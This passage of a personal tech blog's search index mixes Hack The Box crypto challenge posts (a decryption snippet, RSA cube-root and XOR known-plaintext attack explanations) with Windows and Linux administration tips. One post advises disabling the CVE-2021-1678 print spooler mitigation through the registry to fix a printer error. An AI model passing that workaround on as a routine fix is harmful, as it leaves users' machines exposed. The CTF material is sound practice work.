InvertESwapChar(ct): # Left side -&gt; Revert (THIS_MSB xor 0x0D) pt_upper = ValidateChar(ct) # Convert 4 upper bits to 0 (Masking pt_upper) for i in range(4, 8): pt_upper = pt_upper &amp; ~(1 &lt;&lt; i) pt_upper = pt_upper ^ 0x0D pt_upper = pt_upper &lt;&lt; 4 # Right side -&gt; Revert (bitlst(THIS_LSB, 4) xor 0xB0) pt_lower = ValidateChar(ct) # Convert 4 lower bits to 0 (Masking pt_lower) for i in range(4): pt_lower = pt_lower &amp; ~(1 &lt;&lt; i) pt_lower = pt_lower ^ 0xB0 # = bitlst pt_lower = pt_lower &gt;&gt; 4 # bitlst &gt;&gt; 4 pt = pt_upper | pt_lower return chr(pt)To solve this challenge, I did a python script that you can see at: luna_decrypt.pyLunaCrypt has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - Baby Time Capsule pwned!", "url": "/posts/htb-baby-time-capsule/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-09-29 02:00:01 +0200", "snippet": "Baby Time Capsule has been PwnedEnjoy! ;)", "content": "Baby Time Capsule has been PwnedEnjoy! ;)" }, { "title": "How to check NTP servers from Windows", "url": "/posts/check-ntp-servers-windows/", "categories": "windows, administration", "tags": "windows, administration, ntp, sntp, nis, time", "date": "2022-09-23 02:00:01 +0200", "snippet": "Sometimes we need to retrieve the date from a NTP Network Time Protocolserver to record it somewhere.The first thing is to know if the server is working and reacheable from our computer (yep, firew...", "content": "Sometimes we need to retrieve the date from a NTP Network Time Protocolserver to record it somewhere.The first thing is to know if the server is working and reacheable from our computer (yep, firewalls still works).Then we can check the returned date format to adapt to our needs.The most common thing is that we have to use a NIST server or a SNPT server. And, at the moment of checking them and programming, there is subtle differences between them.Checking a NIST serverCheck a NIST server is very straightforward. These servers listens on port 13, and responds to TCP or UDP requests.We can do a simple telnet or a netcat to check it. For example, if we wanted to check if time-c.nist.gov will work for us:windows &gt; run &gt; cmdtelnet time-c.nist.gov 13netcat time-c.nist.gov 13Checking a SNTP serverCheck a SNTP is not as straightforward as check a NTP server. SNTP servers uses the UDP protocol and the 123 port.Telnet or netcat won’t work for us…But we can use w32tm.For example, if we wanted to check if ntp02.oal.ul.pt will work for us:windows &gt; run &gt; cmdw32tm /stripchart /computer:ntp02.oal.ul.pt /dataonly /samples:1Enjoy! ;)" }, { "title": "Hack The Box - Optimus Prime pwned!", "url": "/posts/htb-optimus-prime/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-09-21 02:00:01 +0200", "snippet": "Optimus Prime has been PwnedWalkthroughYou can take a look at the script I used to solve it: decrypticon.pyEnjoy! ;)", "content": "Optimus Prime has been PwnedWalkthroughYou can take a look at the script I used to solve it: decrypticon.pyEnjoy! ;)" }, { "title": "Hack The Box - RSAisEasy pwned!", "url": "/posts/htb-rsaiseasy/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-09-16 02:00:01 +0200", "snippet": "RSAisEasy has been PwnedEnjoy! ;)", "content": "RSAisEasy has been PwnedEnjoy! ;)" }, { "title": "Fixing error 0x0000011b on Windows 10", "url": "/posts/fixing-error-0x0000011b-windows10/", "categories": "windows10, administration", "tags": "windows10, administration, windows, error, printer", "date": "2022-09-16 02:00:01 +0200", "snippet": "A few days ago, as a personal favor, I had to configure some network printers between some Windows 10 computers.Nothing complicated… Until error 0x0000011b appeared… Windows cannot connect to the ...", "content": "A few days ago, as a personal favor, I had to configure some network printers between some Windows 10 computers.Nothing complicated… Until error 0x0000011b appeared… Windows cannot connect to the printer. Error: Operation failed with error 0x0000011b on the network.What is error 0x0000011b?Error 0x0000011b is a bug that, in most cases, has occurred after the installation of a security patch that mitigates the Windows Print Spooler Spoofing Vulnerability CVE-2021-1678.How to Fix Printer Error 0x0000011b?As it is a bug that occurs after a windows update, my first option was to update the machines.In theory, to this day, Microsoft has fixed this bug, but it did not work for me.So after a bit of googling I saw that other solutions were to uninstall a couple of updates and prevent them from being reinstalled or edit the windows registry to disable the security patch.I ruled out the option to uninstall updates and set windows update not to install them again, basically for the following reasons: The user does not have an advanced profile and it is very possible that he will reinstall the updates by updating windows, and then he will be left without printers again… The time it would take to uninstall certain updates one by one and test if the error was fixed The chance of someone exploiting that vulnerability in that environment is very remote The vulnerability does not seem criticalOnce the windows update related options were discarded, the only thing left to do was to give it a try to edit the windows registry…Editing the windows registry to disable CVE-2021-1678 mitigation Run regedit.exe Navigate to HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Print Create new New DWORD (32-bit) Value named RpcAuthnLevelPrivacyEnabled with value 0 RebootAnd… Works for me!Enjoy! ;)" }, { "title": "Hack The Box - Nuclear Sale pwned!", "url": "/posts/htb-nuclear-sale/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-09-09 02:00:01 +0200", "snippet": "Nuclear Sale has been PwnedWalkthroughYou can take a look at the script I used to solve it: nuclear_sale_decrypt.pyEnjoy! ;)", "content": "Nuclear Sale has been PwnedWalkthroughYou can take a look at the script I used to solve it: nuclear_sale_decrypt.pyEnjoy! ;)" }, { "title": "Configuring awesome window manager", "url": "/posts/configuring-awesomewm/", "categories": "awesomewm, configuration", "tags": "awesomewm, configuration, gnu/linux, windows manager, tiling", "date": "2022-09-09 02:00:01 +0200", "snippet": "My favorite tiling windows manager is awesome window manager (also called awesome or awesomewm).Awesome does not need mouse, everything can be performed with the keyboard and this is great when you...", "content": "My favorite tiling windows manager is awesome window manager (also called awesome or awesomewm).Awesome does not need mouse, everything can be performed with the keyboard and this is great when you are using a laptop.Awesome comes complete with its own status bar and can handle a lot of things by default, but uses Lua scripting language for its configuration and, at first, could be a little messy.So where do we start to configure it?Preparing the configuration filesWe will store our configuration file and theme under the .config/ folder in our /home$ mkdir -p ~/.config/awesome/themes/rubenNow, we will copy the default awesome configuration file and theme to edit them and configure to our liking.$ sudo cp /etc/xdg/awesome/rc.lua ~/.config/awesome$ sudo cp /usr/share/awesome/themes/default/theme.lua ~/.config/awesome/themes/rubenConfiguring awesomeIn this section we will edit the ~/.config/awesome/rc.lua file.Setting the themeWe need to set our theme path as the parameter passed to beautiful.init:beautiful.init(\"/home/ruben/.config/awesome/themes/ruben/theme.lua\")Customizing our environmentTo do this, wi will edit our ~/.config/awesome/rc.lua file, and we will configure a few sections.Window layoutsMostly, I only use the maximized layout, but I leave the floating layout for applications that starts with a login dialog, the calculator, and so.So in the next section I comment all the others: awful.layout.layouts = { awful.layout.suit.floating, -- awful.layout.suit.tile, -- awful.layout.suit.tile.left, -- awful.layout.suit.tile.bottom, -- awful.layout.suit.tile.top, -- awful.layout.suit.fair, -- awful.layout.suit.fair.horizontal, -- awful.layout.suit.spiral, -- awful.layout.suit.spiral.dwindle, awful.layout.suit.max, -- awful.layout.suit.max.fullscreen, -- awful.layout.suit.magnifier, -- awful.layout.suit.corner.nw, -- awful.layout.suit.corner.ne, -- awful.layout.suit.corner.sw, -- awful.layout.suit.corner.se, }TagsIn this section we will configure the number of tags we want and their text.I only use 2 tags in each screen, and, really, I change the numbers for hack nerd font characters.awful.tag({ \"1\", \"2\" }, s, awful.layout.layouts[1])Menu bar launcherI don’t use the menu bar from the wibar, neither in the mouse (I prefer the Super+p or Super+r shortcuts), so I comment the following awesome menu sections:--myawesomemenu = {-- { \"hotkeys\", function() hotkeys_popup.show_help(nil, awful.screen.focused()) end },-- { \"manual\", terminal .. \" -e man awesome\" },-- { \"edit config\", editor_cmd .. \" \" .. awesome.conffile },-- { \"restart\", awesome.restart },-- { \"quit\", function() awesome.quit() end },--}-- local menu_awesome = { \"awesome\", myawesomemenu, beautiful.awesome_icon }-- local menu_terminal = { \"open terminal\", terminal }-- if has_fdo then-- mymainmenu = freedesktop.menu.build({-- before = { menu_awesome },-- after = { menu_terminal }-- })--else-- mymainmenu = awful.menu({-- items = {-- menu_awesome,-- { \"Debian\", debian.menu.Debian_menu.Debian },-- menu_terminal,-- }-- })--end--mylauncher = awful.widget.launcher({ image = beautiful.awesome_icon,-- menu = mymainmenu })-- Menubar configuration--menubar.utils.terminal = terminal -- Set the terminal for applications that require it-- }}}-- root.buttons(gears.table.join(-- awful.button({ }, 3, function () mymainmenu:toggle() end),-- awful.button({ }, 4, awful.tag.viewnext),-- awful.button({ }, 5, awful.tag.viewprev)--))--clientbuttons = gears.table.join(-- awful.button({ }, 1, function (c)-- c:emit_signal(\"request::activate\", \"mouse_click\", {raise = true})-- end),-- awful.button({ modkey }, 1, function (c)-- c:emit_signal(\"request::activate\", \"mouse_click\", {raise = true})-- awful.mouse.client.move(c)-- end),-- awful.button({ modkey }, 3, function (c)-- c:emit_signal(\"request::activate\", \"mouse_click\", {raise = true})-- awful.mouse.client.resize(c)-- end)--)Left widgets{ -- Left widgets layout = wibox.layout.fixed.horizontal, --mylauncher, s.mytaglist, s.mypromptbox,},Right widgetsIn this section we will comment all the widgets that will not use, later we can add ours.I only want to keep the clock widget, so I comment the others:{ -- Right widgets layout = wibox.layout.fixed.horizontal, -- mykeyboardlayout, -- wibox.widget.systray(), mytextclock, -- s.mylayoutbox,},Custom key bindingsFirst of all I interchange the Super+j and Super+k keybinndings, is more intiutive this way for me.One of the advantages to use a tiling window manager is have our custom shortcuts, so I always add a few.For example, if we want a shortcut to firefox, we will edit the Key bindings section and add:awful.key({ modkey }, \"f\", function() awful.util.spawn(\"firefox\") end, {description = \"firefox\", group = \"internet\"}) Be careful in this step. The previous entry has to end with a colon, and the last entry in this section has to end without colon.Mapping applications to screen tagsIf we want an application always running in a screen tag, we only have to set a rule.For example, if we want that MPlayer runs always in the tag 1 of screen 2:{ rule = { class = \"MPlayer\" }, properties = { screen = 2, tag = \"1\" } },Removing gapsFor some reason, some windows, in maximized mode, have gaps at the right and bottom. To remove the gaps I add the size_hints_honor = false to the rules{ rule_any = {type = { \"normal\", \"dialog\" } }, properties = { titlebars_enabled = false, size_hints_honor = false }},Configuring our themeIn this section we will edit the our theme file, in my case: ~/.config/awesome/themes/ruben/theme.luaFontI find the default font a bit small, so I change it and set one a little bit bigger:theme.font = \"Hack Nerd Font Mono Regular 9\"Taglist fontI like to see the taglists very big, so I set their font to one bigger:theme.taglist_font=\"Hack Nerd Font Mono Regular 16\"WallpaperWe can set our wallpaper editing the theme.wallpaper value:theme.wallpaper = themes_path..\"ruben/background.jpg\"If we don’t have our wallpaper on the themes_path, we can set it with adding its absolute path:theme.wallpaper = themes_path..\"/home/ruben/images/wallpaper.jpg\"Add widgetsWe can add our widgets to end the configuration. A good startingp point is https://github.com/streetturtle/awesome-wm-widgetlogout-menu-widgetI usually install the logout-menu-widget.And I have to fix it: Fixing awesome logout-menu-widget.Custom widgetsI want to see the CPU and memory (RAM) usage, so I add a couple of custom widgets based on vicious to do it.To do this, as these widgets are based on vicious I have to add the following line at the beginning of the rc.lua file:local vicious = require(\"vicious\")Then, after the following section of the rc.lua file -- Create a tasklist widget s.mytasklist = awful.widget.tasklist(s, awful.widget.tasklist.filter.currenttags, tasklist_buttons)I add my two custom widgets: -- CPU widget cpuwidget = wibox.widget.textbox() cpuwidget.forced_width=65 vicious.register(cpuwidget, vicious.widgets.cpu, \" CPU: $1%\", 2) -- MEM widget memwidget = wibox.widget.textbox() memwidget.forced_width=65 vicious.register(memwidget, vicious.widgets.mem, \" MEM: $1%\", 2)And then I add the two custom widgets to the wibos on the positions that I want.Configuring the clock (mytextclock or textclock) format:I only want to see the hour and the minutes. If you, as me, want another time format you only need to pass the date format to the textclock() function:mytextclock = wibox.widget.textclock(\" %H:%M \") The formats are the same as in the linux date commandMy own widgets (ip and hackthebox)You also may find interesting my own awesome widgets: awesome ip widget awesome htb widgetGTK applications with dark themeFor personal reasons I usually work with dark themes, but awesome does not have one, is not its job.If you, as me, want applications in dark mode and you have installed gtk applications, you only have to modify the settings.ini files contained in the gtk-*.*/ directories under ~./config and set:gtk-application-prefer-dark-theme=1Default browserIf we have many browsers installed and we want to use one of them as default browser, for instance firefox, we will find that some applications will open the links in another browser.To solve this we will need to set the default browser, system-wide and user-specific. For instance, in debian:System-wide$ sudo update-alternatives --config x-www-browserUser-specific$ xdg-settings set default-web-browser firefox-esr.desktopAutostart applicationsIf we want execute applications and/or scripts when our awesome starts, we have to add it at the end of the ~/.config/awesome/rc.lua, e.g.:-- Autostartawful.spawn.with_shell(\"~/scripts/my_config_script\")Backup and cleanWhen we have awesome running configured to our liking, we can make a backup of our configuration files and themes, then we can remove the commented lines and their associated sections and/or declarations. This way we will have a (slightly) lighter configuration and window manager and, with our backup, we can always go back in case something goes wrong.Further readings My first awesome awesome - ArchWiki awesome recipes Debian Wiki - AwesomeEnjoy! ;)" }, { "title": "Hack The Box - RLotto pwned!", "url": "/posts/htb-rlotto/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-09-08 02:00:01 +0200", "snippet": "RLotto has been PwnedWalkthroughYou can take a look at the script I used to solve it: lotto_seer.pyEnjoy! ;)", "content": "RLotto has been PwnedWalkthroughYou can take a look at the script I used to solve it: lotto_seer.pyEnjoy! ;)" }, { "title": "Set a resolution manually in GNU/Linux", "url": "/posts/set-resolution-manually-gnu-linux/", "categories": "gnu/linux, screen resolution", "tags": "gnu/linux, screen, resolution", "date": "2022-09-02 02:00:01 +0200", "snippet": "Lately I’m having problems with mi secondary screen. For some reason it loses its resolution and I have to add it manually.To add a resolution manually in GNU/Linux we need: Generate a modeline fo...", "content": "Lately I’m having problems with mi secondary screen. For some reason it loses its resolution and I have to add it manually.To add a resolution manually in GNU/Linux we need: Generate a modeline for our resolutioncvt 1680 1050 60This will show the following result# 1680x1050 59.95 Hz (CVT 1.76MA) hsync: 65.29 kHz; pclk: 146.25 MHzModeline \"1680x1050_60.00\" 146.25 1680 1784 1960 2240 1050 1053 1059 1089 -hsync +vsync Add the modeline with xrandr:xrandr --newmode \"1680x1050_60\" 146.25 1680 1784 1960 2240 1050 1053 1059 1089 -hsync +vsync Identify our screensxrandr -qThis will show an output like:Screen 0: minimum 320 x 200, current 3360 x 1050, maximum 8192 x 8192DVI-I-1 connected primary 1680x1050+0+0 (normal left inverted right x axis y axis) 434mm x 270mm 1680x1050 59.88*+ 59.95...DVI-I-2 connected 1680x1050+1680+0 (normal left inverted right x axis y axis) 640mm x 360mm 1360x768 59.80 +...Our screens are DVI-I-1 and DVI-I-2. In this case we will add the resolution to DVI-I-2. Add it to our screenxrandr --addmode DVI-I-2 1680x1050_60 Set the resolution to our screenxrandr --output DVI-I-2 --mode 1680x1050_60The changes will be lost after reboot. To keep the resolution permanently we can create the file ~/.xprofile with the following content:#!/bin/bash# Generate modeline# cvt 1680x1050 60xrandr --newmode \"1680x1050_60\" 146.25 1680 1784 1960 2240 1050 1053 1059 1089 -hsync +vsyncxrandr --addmode DVI-I-2 1680x1050_60xrandr --output DVI-I-2 --mode 1680x1050_60Enjoy! ;)" }, { "title": "Add applications to gnome menu", "url": "/posts/add-applications-gnome-menu/", "categories": "gnu/linux, gnome", "tags": "gnu/linux, gnome, configuration", "date": "2022-08-26 02:00:01 +0200", "snippet": "When we install applications from outside the repositories these applications are not added automatically to the gnome menu.How can we add them to the menu?In gnome applications are added to the me...", "content": "When we install applications from outside the repositories these applications are not added automatically to the gnome menu.How can we add them to the menu?In gnome applications are added to the menu through .desktop files..desktop files are in two paths: /usr/share/applications/ ~/.local/share/applicationsTo add an application to the menu we need to create a .desktop file for the application in either of the two paths.For instance, if we want to add an entry in the menu for myNewApplication we will create myNewApplication.desktop file in one of the paths with the following content (setting the values for our application):[Desktop Entry]Version=1.0.0Type=ApplicationName=My new applicationIcon=/path/to/mynewapplication/images/icon.svgExec=/path/to/mynewapplication/bin/mynewapplication.shComment=My new applicationCategories=Category1;Category2Terminal=falseStartupWMClass=jetbrains-pycharm-ceStartupNotify=trueStartupWMClassStartupWMClass is a property to associate windows with the owning application. Avoids to have multiple copies of the same icon on the dock for many java-based applications.To find out which WM_CLASS has our application, we can run xprop on a terminal an then click at the application window.xprop WM_CLASSEnjoy! ;)" }, { "title": "Hack the box Lost Modulus pwned!", "url": "/posts/htb-lost-modulus/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, crypto, htb, Lost Modulus, RSA", "date": "2022-08-25 02:00:01 +0200", "snippet": "Challenge description I encrypted a secret message with RSA but I lost the modulus. Can you help me recover it?SolutionWhen we extract the Lost Modulus.zip file we found two files: challenge.py →...", "content": "Challenge description I encrypted a secret message with RSA but I lost the modulus. Can you help me recover it?SolutionWhen we extract the Lost Modulus.zip file we found two files: challenge.py → The script used for the custom RSA implementation output.txt → The encrypted flagWe take a look at the challenge.py script and the RSA implmentation seems legit…We can see that the script is trying to open a flag.txt file:flag = open('flag.txt', 'r').read().strip().encode()And we can see that the given encrypted flag is written in hexadecimal:print ('Flag:', crypto.encrypt(flag).hex())Fist of all, I will apply the pep 8 coding conventios to the script, because it’s giving me the creeps… :SThen I will create the flag.txt file and with the hexadecimal flag contained in the output.txt file (without the ‘Flag: ‘ part).And now… I found two solutions for this challenge:The easy waySince the script has the decrypt function, and seems legit, the first thing is to give it a try… Eventually it will works. So we can automatize this process with a little function:def decrypt_flag(crypto):\tencrypted_flag_hex = flag.decode()\tencrypted_flag_bytes = bytes.fromhex(encrypted_flag_hex)\tdecrypted_flag_bytes = b'' \twhile b'HTB{' not in decrypted_flag_bytes: \t\tdecrypted_flag_bytes = crypto.decrypt(encrypted_flag_bytes)\tprint('Decrypted flag bytes: ', decrypted_flag_bytes)We call the function from the main passing crypto as argument and wait for it to finish.To do this I only modified the challenge.py script. You can see the full script at EasyWay.pyThe cube root attackIs one of the simpliest attacks on RSA. When encrypting with low encryption exponents (i.e. e = 3) and small values of the m (i.e. m &lt; n1/e), the result of m^e is strictly less than the modulus n. In this case, the modulus n loses its importance, has no effect, and the encryption goes from (m^e)%n to m^e; so: ct = (m^e)%n = m^e and ciphertext can be decrypted easily taking the eth root of the ciphertext: pt = sqrt(e, ct); in this case pt = sqrt(3, m).To solve this challenge, I did a self-explanatory python script that you can see at CubeRootAttack.pyLost Modulus has been PwnedEnjoy! ;)" }, { "title": "Start a program automatically on Windows 10", "url": "/posts/start-program-automatically-windows10/", "categories": "windows10, administration", "tags": "windows10, administration", "date": "2022-08-19 02:00:01 +0200", "snippet": "Usually, the ideal is to have the minimum programs running at startup on windows, but sometimes we need to add some program to the startup.To get a program run at startup on Windows 10: Press the ...", "content": "Usually, the ideal is to have the minimum programs running at startup on windows, but sometimes we need to add some program to the startup.To get a program run at startup on Windows 10: Press the keys: win+r On the run box write the next command: shell:startup Drag the shortcut to the program that we want to run at startup to the window that just opened. RebootEnjoy! ;)" }, { "title": "Hack The Box - The Last Dance pwned!", "url": "/posts/htb-the-last-dance/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-08-19 02:00:01 +0200", "snippet": "The Last Dance has been PwnedEnjoy! ;)", "content": "The Last Dance has been PwnedEnjoy! ;)" }, { "title": "netselect-apt", "url": "/posts/netselect-apt/", "categories": "debian, administration", "tags": "debian, administration, gnu/linux", "date": "2022-08-12 02:00:01 +0200", "snippet": "netselect-apt is a script to create an apt sources.list file automatically by downloading the list of Debian mirrors and choosing the fastest.Install netselect-apt$ sudo apt install netselect-aptRu...", "content": "netselect-apt is a script to create an apt sources.list file automatically by downloading the list of Debian mirrors and choosing the fastest.Install netselect-apt$ sudo apt install netselect-aptRun netselect-aptWe can choose our debian branch stable/testing/sid for the test$ sudo netselect-apt -s stableAt this point, netselect-apt will have generated a sources.list file for the fastest mirror available on the directory where we have executed it.We can now substitute our /etc/apt/sources.list by the sources.list generated by netselect-apt or we can edit our /etc/apt/sources.list and sustitute the mirrors by the chosen ones by netselect-apt.I always recommend to backup /etc/apt/sources.list before making changes.Enjoy! ;)" }, { "title": "Disable hibernation on Windows10", "url": "/posts/disable-hibernation-windows10/", "categories": "windows10, administration", "tags": "windows10, administration, windows, hibernation", "date": "2022-08-05 02:00:01 +0200", "snippet": "Hibernate is a power option that will allow you to turn off your computer but save all the work you had open for when it is turned on again. The downside is that hibernation uses some storage space...", "content": "Hibernate is a power option that will allow you to turn off your computer but save all the work you had open for when it is turned on again. The downside is that hibernation uses some storage space on your computer.I have a laptop with a relative small HD, so each Gb counts. In my case the hibernation file is occuping about 4Gb. I’ve never used hibernation, and I don’t think I’m going to start at this point, so why have a useless file occupying about 4Gb?To disable completly hibernation on windows10:Run cmd as administrator and execute:powercfg.exe /hibernate offEnjoy! ;)" }, { "title": "Windows 10 productivity tricks", "url": "/posts/windows-10-productivity-tricks/", "categories": "windows10, productivity", "tags": "windows10, productivity, windows", "date": "2022-07-29 02:00:01 +0200", "snippet": "I am writting this article as a result of a conversation I recently had with a friend.It was a very interesting conversation where, among others, we interchanged some Windows 10 tricks.Clipboard hi...", "content": "I am writting this article as a result of a conversation I recently had with a friend.It was a very interesting conversation where, among others, we interchanged some Windows 10 tricks.Clipboard history (clipboard on steroids)Since 2018, Windows 10 has included a clipboard history that you can use to paste a list of recently copied items into any program.The clipboard history holds the most recent 25 text snippets, HTML, and images smaller than 4MB.You can delete history items or all history, and you also can pin elements to the history.The clipboard history is deleted each time you restart the computer and, if you use a microsoft account, you can sync your clipboard between devices using this account.To enable the clipboard history: Start button &gt; Settings &gt; System &gt; Clipboard &gt; Clipboard history onTo use the clipboard history use the shortcut: win+vPaste plain text (text without format)When pasting some text that you have copied to the clipboard some applications keep the formatting of the text and it becomes awkward to read.To remove formatting when pasting use the shortcut: ctrl+shift+v“Snipping tool” and/or “Snip and sketch”“Snipping tool” was being abandoned in 2018 replaced by “Snip and sketch”. However, “Snipping tool” still works and Microsoft merged both apps into a redesigned “Snipping tool” on Windows 11.“Snipping tool” and “Snip and sketch” are the native and most direct way to take a custom screenshot on Windows 10.With these applications you can take a rectangular, free form or full screen capture and you can customize, annotate and share you screenshot.To use “Snipping tool” press the win key and type “Snipping”, select it, and press enter.To use “Snip and sketch”: Press the win key and type “Snip”, select it, and press enter Use the shortcut: win+shift+sBonus: FlameshotFlameshot is my preferred way to do take an screenshot (on Windows and GNU/Linux). Sadly, in certain contexts, it’s easier go back to “Snip and sketch” :(As they say in their web: Flameshot is a free and open-source, cross-platform tool to take screenshots with many built-in features to save you time.You can add arrows, hihglighting, blurring, text, draws, shapes, numbers (with an incrementing counter) and color boxes.You can take a look and download Flameshot from https://flameshot.org/ or from https://github.com/flameshot-org/flameshotEnjoy! ;)" }, { "title": "Upload a package to PyPI", "url": "/posts/upload-package-pypi/", "categories": "python, pypi", "tags": "programming, python, pypi", "date": "2022-07-22 02:00:01 +0200", "snippet": "Although the Packaging Python Projects tutorial is very detailed in how to package a Python Project, I encountered some difficulties at the time of do it, so I’m going to leave here a summary and s...", "content": "Although the Packaging Python Projects tutorial is very detailed in how to package a Python Project, I encountered some difficulties at the time of do it, so I’m going to leave here a summary and some notes to my future me ;)First of all, if we want made our application available as a command-line tool, we need to define an entry point in our pyproject.toml:[project.scripts]projectname = \"projectname.projectname:main\"Creating accountsWe will need two accounts: test.pypy.org pypi.orgUpdating the toolsWe will need to have installed the last version of build and twine:python3 -m pip install --upgrade buildpython3 -m pip install --upgrade twineBuildingRun this command from the same directory where pyproject.toml is located:python3 -m buildConfiguring the access to test.pypi.orgWe will need to create a PyPI API token to securely upload our project. We can create one at https://test.pypi.org/manage/account/#api-tokensTo avoid having to copy and paste the token every time you upload, we can create a $HOME/.pypirc file:[distutils] index-servers = testpypi projectname[testpypi] username = __token__ password = pypi-token[fail2bangeolocation] repository = https://test.pypi.org/legacy/ username = __token__ password = pypi-tokenUploading the package to testpypipython3 -m twine upload --repository testpypi dist/*Checking test package installationpython3 -m pip install --index-url https://test.pypi.org/simple/ projectnameIf everything went well…Uploading the package to PyPIpython3 -m twine upload dist/*Checking package installationpip3 install projectnameSources: Packaging Python Projects Entry points specification Metadata HatchEnjoy! ;)" }, { "title": "fail2bangeolocation", "url": "/posts/fail2bangeolocation/", "categories": "personal, portfolio", "tags": "personal, portfolio, development, fail2bangeolocation, fail2ban, geolocation", "date": "2022-07-16 02:00:01 +0200", "snippet": "I have an old raspberry pi running some services 24/7 and with (very protected) remote access enabled.For some reason the raspberry receives a big number of bruteforce attacks trying to log in.To k...", "content": "I have an old raspberry pi running some services 24/7 and with (very protected) remote access enabled.For some reason the raspberry receives a big number of bruteforce attacks trying to log in.To know from which locations I was being attacked the most I did a python application to geolocate the failed attempts registered by fail2ban.I learned many things developing this application. The most remarkable, for me, it was the process of packaging the application in order to upload it to PyPI.The application is called fail2bangeolocation, and you can install it via pip.With fail2bangeolocation you can geolocate all the ips registered by fail2ban, all the ips registered for fail2ban only for a certain service or all the ips contained in a fail2ban log file. And you can group the output by country or by country and city.Screenshots Output grouped by countryfail2bangeolocation output grouped by country Output grouped by country and cityfail2bangeolocation output grouped by country and city You can take a look at the application source code in https://github.com/rubenhortas/fail2bangeolocationEnjoy! ;)" }, { "title": "Find files containing specific text on GNU/Linux", "url": "/posts/find-files-containing-specific-text-gnu-linux/", "categories": "gnu/linux, grep", "tags": "gnu/linux, grep", "date": "2022-06-24 02:00:01 +0200", "snippet": "Sometimes we need to find all files containing a specific text withing the files, not in the file name.We can achieve this with grep and a few parameters:grep -irnwl /path -e 'pattern' -i ignore c...", "content": "Sometimes we need to find all files containing a specific text withing the files, not in the file name.We can achieve this with grep and a few parameters:grep -irnwl /path -e 'pattern' -i ignore case -r recursive -n line number -w match the whole word (Do not use if not necessary) -l give the file name -e searched patternIf we want to find several words we can do it using several -e options and arguments:grep -irnwl /path -e 'pattern1' -e 'pattern2'Or using the -E (extended regular expression) option and separating the words with the vertical bar:grep -irnwE 'pattern1|pattern2' /pathEnjoy! ;)" }, { "title": "Keep alive ssh sessions", "url": "/posts/keep-ssh-session-alive/", "categories": "gnu/linux, ssh", "tags": "gnu/linux, ssh, configuration", "date": "2022-06-17 02:00:01 +0200", "snippet": "Sometimes firewalls time out idle sessions after a certain period of time.We can avoid have our SSH sessions killed with a few options to keep alive ssh sesions.We can configure the keep alive on t...", "content": "Sometimes firewalls time out idle sessions after a certain period of time.We can avoid have our SSH sessions killed with a few options to keep alive ssh sesions.We can configure the keep alive on the server side or on the client side. On the client side:We need to edit the ~/.ssh/config file and add or uncomment the following lines:ServerAliveInterval 300ServerAliveCountMax 2 On the server side:We need to edit the /etc/ssh/sshd_config file and add or uncomment the following lines:ClientAliveInterval 300ClientAliveCountMax 2Finally we need to restart our sshd server.Thanks to Rodrigo Rega!Enjoy! ;)" }, { "title": "Python charset detection", "url": "/posts/python-charset-detection/", "categories": "python, charset detection", "tags": "python, charset, programming", "date": "2022-06-10 02:00:01 +0200", "snippet": "We can use the chardet module to detect the charset (or character encoding) of a file.This can come handy when we need to analyze a text file.To install chardet:$ sudo pip3 install chardetNow we ha...", "content": "We can use the chardet module to detect the charset (or character encoding) of a file.This can come handy when we need to analyze a text file.To install chardet:$ sudo pip3 install chardetNow we have a command line tool called chardetect to find files charset:chardetect file.txtfile.txt: ascii with confidence 1.0Enjoy! ;)" }, { "title": "Python web server", "url": "/posts/python-web-server/", "categories": "python, web server", "tags": "python, web server, web, server, programming", "date": "2022-06-03 02:00:01 +0200", "snippet": "If we want to test a web site or share some files with another person we can have a web server running quickly with python only running one command: Run a web server on the current directory:$ pyt...", "content": "If we want to test a web site or share some files with another person we can have a web server running quickly with python only running one command: Run a web server on the current directory:$ python3 -m http.server Run a web server on other directory:$ python3 -m http.server --directory /other/directory Run a web server on another portPython web server listens to port 8000 by default.The default port can be overriden by passing the desired port number as argument:$ python3 -m http.server 443Enjoy! ;)" }, { "title": "Which version of windows do I have?", "url": "/posts/which-version-of-windows/", "categories": "windows, administration", "tags": "windows, version, administration, winver", "date": "2022-05-29 02:00:01 +0200", "snippet": "Sometimes we have to work by connecting to machines that we don’t know which version of windows they are running.And sometimes we have to know what is the exact version of windows to perform a spec...", "content": "Sometimes we have to work by connecting to machines that we don’t know which version of windows they are running.And sometimes we have to know what is the exact version of windows to perform a specific task.To find out what version of Windows your device is running: press Win+R, type winver in the open box, and then select Ok.Enjoy! ;)" }, { "title": "XOR known-plaintext attack", "url": "/posts/xor-known-plaintext-attack/", "categories": "cryptography, xor", "tags": "cryptography, xor, security, vulnerabilities", "date": "2022-05-20 02:00:01 +0200", "snippet": "XOR cipher is a type of additive cipher extremely common as a component in more complex ciphers.XOR cipher can trivially be broken using frequency analysis, and, if the content of any message can b...", "content": "XOR cipher is a type of additive cipher extremely common as a component in more complex ciphers.XOR cipher can trivially be broken using frequency analysis, and, if the content of any message can be guessed or, otherwise, known then the keythen can be revealed.The XOR cipher is vulnerable to a known-plaintext attack (KPA) since:plaintext ⊕ ciphertext = keyIt’s also trivial to flip arbitrary bits in the decrypted plaintext by manipulating the ciphertext. This is called malleability.Known-plaintext attack explainedIf we can guess, or we know, the initial plain text string (or at least a part of it) and we know the result ciphertext we can guess the key used to encrypt. Once we get the key we can get the initial plain text string only reapplying the XOR function with the guessed key to the ciphertext:Plaintext ⊕ Key = Ciphertext → Ciphertext ⊕ Key = PlaintextI wrotte a little pyhton script to show how this attack works and I added it to my collection of python examples.You can take a look at the example in https://github.com/rubenhortas/python_examples/blob/master/cryptography/xor_kpa.pyEnjoy! ;)" }, { "title": "Hack The Box - xorxorxor pwned!", "url": "/posts/htb-xorxorxor/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-05-12 02:00:01 +0200", "snippet": "xorxorxor (has been PwnedEnjoy! ;)", "content": "xorxorxor (has been PwnedEnjoy! ;)" }, { "title": "Hack the box - Canvas pwned!", "url": "/posts/htb-canvas/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, misc, htb, canvas, javascript", "date": "2022-05-10 02:00:01 +0200", "snippet": 